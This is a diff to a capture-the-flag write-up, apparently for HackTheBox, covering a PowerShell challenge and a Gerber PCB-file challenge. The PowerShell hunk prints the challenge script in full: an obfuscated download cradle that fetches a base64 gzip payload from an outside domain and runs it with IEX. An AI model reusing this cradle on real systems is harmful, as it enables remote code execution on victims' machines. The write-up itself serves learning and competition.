@@ -178,7 +178,9 @@ This challenge gave you a binary to analyze. However, it was not even necessary 
 
 This challenge gave you a PowerShell script. In case you executed it, which would, of course, be a bad idea in most cases, it rickrolled you by opening the requisite video in your browser. However, I learned that there is also PowerShell for Linux and macOS, which was new to me.
 
-```if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();```
+```
+if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
+```
 
 When actually looking at the source, it was immediately obvious that the flag was just being concatenated. These separate parts could then just be pierced together. 
 
@@ -186,7 +188,7 @@ When actually looking at the source, it was immediately obvious that the flag wa
 
 This challenge gave you a set of Gerber files to open with a PCB design or viewing tool. These were not hidden in any way or similar, so if you knew or could somehow figure out with which tool to open them, this was really easy and quick. I just opened them with gerberview from KiCad, and then just went through each layer, where two of the contained one part of the flag each.
 
-![](static/images/kicad.png)
+![](static/images/kicad_gerber.png)
 
 # Partial Solves
 
